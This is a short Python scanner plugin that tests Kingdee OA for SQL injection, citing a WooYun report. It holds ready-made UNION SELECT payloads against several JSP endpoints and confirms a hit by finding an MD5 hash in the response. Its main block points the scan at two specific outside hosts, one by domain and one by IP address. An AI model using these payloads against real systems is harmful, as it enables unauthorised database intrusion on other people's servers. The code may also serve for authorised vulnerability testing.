#!/usr/bin/evn  python 
#-*-:coding:utf-8:-*-  
#refer:#http://www.wooyun.org/bugs/wooyun-2015-0137234

# /kingdee/tree/tree/get_mail_value.jsp?ids=1&flag=dept
# /kingdee/tree/tree/get_netcom_lower_selected.jsp?ids=1
# /kingdee/tree/tree/get_selected.jsp?ids=1&flag=dept
#这三个是不能union的  只是盲注给你修改了
def assign(service, arg):
    if service == "kingdee_oa":
        return True, arg

def audit(arg):
    payloads=["kingdee/tree/tree/get_flow.jsp?ids=1&file_type=1)%20union%20select%20NULL,sys.fn_varbintohexstr(hashbytes(%27MD5%27,%20%271234%27))--",
              "kingdee/tree/tree/get_mail.jsp?node=1%20union%20select%20NULL,sys.fn_varbintohexstr(hashbytes(%27MD5%27,%20%271234%27))--",
              "kingdee/tree/tree/get_flow_class.jsp?file_type=1)%20union%20select%20NULL,sys.fn_varbintohexstr(hashbytes(%27MD5%27,%20%271234%27))--",
              "kingdee/tree/tree/get_nodes.jsp?node=1%20union%20select%20NULL,sys.fn_varbintohexstr(hashbytes(%27MD5%27,%20%271234%27))--",
              "kingdee/tree/tree/get_part.jsp?ids=1)%20union%20select%20NULL,sys.fn_varbintohexstr(hashbytes(%27MD5%27,%20%271234%27))--"]
              # "kingdee/tree/tree/get_mail_value.jsp?ids=1&flag=dept%20union%20select%20NULL,sys.fn_varbintohexstr(hashbytes(%27MD5%27,%20%271234%27))--",
              # "kingdee/tree/tree/get_netcom_lower_selected.jsp?ids=1%20union%20select%20NULL,sys.fn_varbintohexstr(hashbytes(%27MD5%27,%20%271234%27))--",
              # "kingdee/tree/tree/get_selected.jsp?ids=1&flag=dept%20union%20select%20NULL,sys.fn_varbintohexstr(hashbytes(%27MD5%27,%20%271234%27))--"]
    for payload in payloads:
        url=arg+payload
        code ,head,res,body,_ = curl.curl(url)
        if code == 200 and '81dc9bdb52d04dc20036dbd8313ed055' in res:
            security_hole(url)      

if  __name__ == '__main__': 
    from dummy import *
    audit(assign('kingdee_oa', 'http://oa.guanhao.com:8080/')[1])
    audit(assign('kingdee_oa', 'http://221.4.245.218:8080/')[1])